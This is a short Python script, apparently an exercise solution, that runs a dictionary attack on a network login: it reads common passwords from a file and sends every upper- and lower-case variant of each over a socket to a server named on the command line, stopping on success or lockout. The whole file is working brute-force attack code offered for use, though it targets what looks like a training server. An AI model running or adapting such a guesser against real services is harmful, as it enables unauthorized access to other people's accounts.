import sys
import socket
import string
import itertools


def create_guesser(password_seed: str):
    """
    Generates an iterator which supplies every possible combination of upper
    and lower-case letters in the given word.

    :param password_seed: The word to be case-varied and used to guess
        the password.
    :returns: Iterator object, which gives a new potential password every time
        next() is called.
    """
    s = password_seed
    return map(lambda x: ''.join(x),
               itertools.product(*zip(s.lower(), s.upper())))


def guess(guess_iterator, socket_object):
    """
    Guesses all possible permutations of the word currently being guessed.

    :param guess_iterator: An iterator which yields all possible combinations
        of upper & lower-case letters in the word currently being guessed.
    :param socket_object: A socket object connected to the server socket. Used
        to communicate with the server.
    :return: If the password was guessed correctly returns the guess (str),
        None if no attempts succeeded, 'LOCKOUT' (str) if the server locked us
        out.
    """
    while True:
        try:
            guess = next(guess_iterator)

            socket_object.send(bytes(guess, encoding='utf-8'))
            reply = socket_object.recv(1024).decode()

            if reply == 'Connection success!':
                return guess
            elif reply == 'Too many attempts':
                return 'LOCKOUT'

        except StopIteration:
            return None


def main():
    """
    Main function for the hacker program.
    """
    word_file_name = 'passwords.txt'

    # get arguments from CL and type-wrangle
    _file, server_ip, server_port = sys.argv
    server_port = int(server_port)

    # establish connection
    with socket.socket() as sock:
        sock.connect((server_ip, server_port))

        with open(word_file_name, 'r') as f:

            while True:
                common_password = f.readline().strip()
                guesser = create_guesser(common_password)
                result = guess(guesser, sock)

                if result == 'LOCKOUT':
                    break
                elif result is not None:  # this means success!
                    print(result)
                    break


if __name__ == '__main__':
    main()
